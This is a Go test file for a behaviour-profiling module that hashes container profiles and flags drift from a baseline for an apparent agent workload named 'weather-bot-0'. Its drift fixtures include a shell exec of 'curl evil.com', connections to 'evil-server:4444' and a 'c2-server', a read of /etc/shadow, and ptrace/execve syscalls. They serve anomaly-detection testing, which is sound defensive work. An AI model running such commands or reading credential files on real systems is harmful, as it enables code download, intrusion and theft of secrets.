package profiling

import (
	"testing"
	"time"
)

func baselineProfile() *ApplicationProfile {
	return &ApplicationProfile{
		Name:      "weather-bot-0",
		Namespace: "vibap-agents",
		Container: "agent",
		Syscalls:  []string{"read", "write", "openat", "close", "mmap", "fstat"},
		Endpoints: []string{"tcp://weather-api:8080", "tcp://dns:53"},
		Execs: []ExecCall{
			{Path: "/usr/bin/python3", Args: []string{"main.py"}},
		},
		FileAccesses: []FileAccess{
			{Path: "/app/config.yaml", Flags: []string{"O_RDONLY"}},
			{Path: "/tmp/cache", Flags: []string{"O_RDWR", "O_CREAT"}},
		},
		Capabilities: []string{"NET_BIND_SERVICE"},
		ProfiledAt:   time.Date(2026, 3, 6, 12, 0, 0, 0, time.UTC),
		Status:       "ready",
	}
}

func TestComputeProfileHash(t *testing.T) {
	t.Run("deterministic", func(t *testing.T) {
		p := baselineProfile()
		h1, err := ComputeProfileHash(p)
		if err != nil {
			t.Fatalf("ComputeProfileHash: %v", err)
		}
		h2, err := ComputeProfileHash(p)
		if err != nil {
			t.Fatalf("ComputeProfileHash: %v", err)
		}
		if h1 != h2 {
			t.Errorf("hashes differ for same profile: %s vs %s", h1, h2)
		}
		if len(h1) != 64 {
			t.Errorf("hash length = %d, want 64", len(h1))
		}
	})

	t.Run("sorted order independence", func(t *testing.T) {
		p1 := &ApplicationProfile{
			Syscalls:  []string{"write", "read", "openat"},
			Endpoints: []string{"b:80", "a:443"},
		}
		p2 := &ApplicationProfile{
			Syscalls:  []string{"openat", "read", "write"},
			Endpoints: []string{"a:443", "b:80"},
		}
		h1, _ := ComputeProfileHash(p1)
		h2, _ := ComputeProfileHash(p2)
		if h1 != h2 {
			t.Errorf("hash should be order-independent: %s vs %s", h1, h2)
		}
	})

	t.Run("different profiles different hash", func(t *testing.T) {
		p1 := &ApplicationProfile{Syscalls: []string{"read"}}
		p2 := &ApplicationProfile{Syscalls: []string{"read", "write"}}
		h1, _ := ComputeProfileHash(p1)
		h2, _ := ComputeProfileHash(p2)
		if h1 == h2 {
			t.Error("different profiles should have different hashes")
		}
	})

	t.Run("nil profile", func(t *testing.T) {
		_, err := ComputeProfileHash(nil)
		if err == nil {
			t.Error("expected error for nil profile")
		}
	})
}

func TestDiffProfiles(t *testing.T) {
	baseline := baselineProfile()

	t.Run("no drift", func(t *testing.T) {
		current := baselineProfile()
		diff := DiffProfiles(baseline, current)
		if diff.HasDrift {
			t.Errorf("unexpected drift: %s", diff.DriftSummary)
		}
	})

	t.Run("new syscall", func(t *testing.T) {
		current := baselineProfile()
		current.Syscalls = append(current.Syscalls, "execve")
		diff := DiffProfiles(baseline, current)
		if !diff.HasDrift {
			t.Error("expected drift for new syscall")
		}
		if len(diff.NewSyscalls) != 1 || diff.NewSyscalls[0] != "execve" {
			t.Errorf("NewSyscalls = %v, want [execve]", diff.NewSyscalls)
		}
	})

	t.Run("new endpoint", func(t *testing.T) {
		current := baselineProfile()
		current.Endpoints = append(current.Endpoints, "tcp://evil-server:4444")
		diff := DiffProfiles(baseline, current)
		if !diff.HasDrift {
			t.Error("expected drift for new endpoint")
		}
		if len(diff.NewEndpoints) != 1 {
			t.Errorf("NewEndpoints count = %d, want 1", len(diff.NewEndpoints))
		}
	})

	t.Run("new exec", func(t *testing.T) {
		current := baselineProfile()
		current.Execs = append(current.Execs, ExecCall{Path: "/bin/sh", Args: []string{"-c", "curl evil.com"}})
		diff := DiffProfiles(baseline, current)
		if !diff.HasDrift {
			t.Error("expected drift for new exec")
		}
		if len(diff.NewExecs) != 1 || diff.NewExecs[0].Path != "/bin/sh" {
			t.Errorf("NewExecs = %v, want /bin/sh", diff.NewExecs)
		}
	})

	t.Run("new file access", func(t *testing.T) {
		current := baselineProfile()
		current.FileAccesses = append(current.FileAccesses, FileAccess{Path: "/etc/shadow", Flags: []string{"O_RDONLY"}})
		diff := DiffProfiles(baseline, current)
		if !diff.HasDrift {
			t.Error("expected drift for new file access")
		}
		if len(diff.NewFileAccesses) != 1 {
			t.Errorf("NewFileAccesses count = %d, want 1", len(diff.NewFileAccesses))
		}
	})

	t.Run("multiple drift types", func(t *testing.T) {
		current := baselineProfile()
		current.Syscalls = append(current.Syscalls, "execve", "ptrace")
		current.Endpoints = append(current.Endpoints, "tcp://c2-server:8443")
		diff := DiffProfiles(baseline, current)
		if !diff.HasDrift {
			t.Error("expected drift")
		}
		if len(diff.NewSyscalls) != 2 {
			t.Errorf("NewSyscalls count = %d, want 2", len(diff.NewSyscalls))
		}
		if len(diff.NewEndpoints) != 1 {
			t.Errorf("NewEndpoints count = %d, want 1", len(diff.NewEndpoints))
		}
		if diff.DriftSummary == "" {
			t.Error("drift summary should be populated")
		}
	})

	t.Run("subset current is ok", func(t *testing.T) {
		current := &ApplicationProfile{
			Syscalls:  []string{"read", "write"},
			Endpoints: []string{"tcp://weather-api:8080"},
		}
		diff := DiffProfiles(baseline, current)
		if diff.HasDrift {
			t.Error("subset behavior should not be drift")
		}
	})
}
